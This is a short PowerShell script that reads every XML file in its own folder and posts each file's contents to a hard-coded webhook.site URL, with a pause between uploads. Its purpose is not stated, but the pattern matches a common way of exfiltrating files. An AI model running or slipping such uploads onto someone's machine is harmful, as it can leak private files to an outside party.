# Set the webhook.site URL
$webhookUrl = "https://webhook.site/e74fbf05-5627-40c0-b491-c407df36bb69"

# Get all XML files in the script's folder
$xmlFiles = Get-ChildItem -Path $PSScriptRoot -Filter *.xml

foreach ($xmlFile in $xmlFiles) {
    # Read the content of the XML file
    $xmlContent = Get-Content -Path $xmlFile.FullName -Raw

    # Send the XML content in the POST request to webhook.site
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $xmlContent -ContentType "application/xml" -UseBasicParsing

    # Pause for a moment to avoid rate-limiting or flooding the webhook
    Start-Sleep -Seconds 5
}
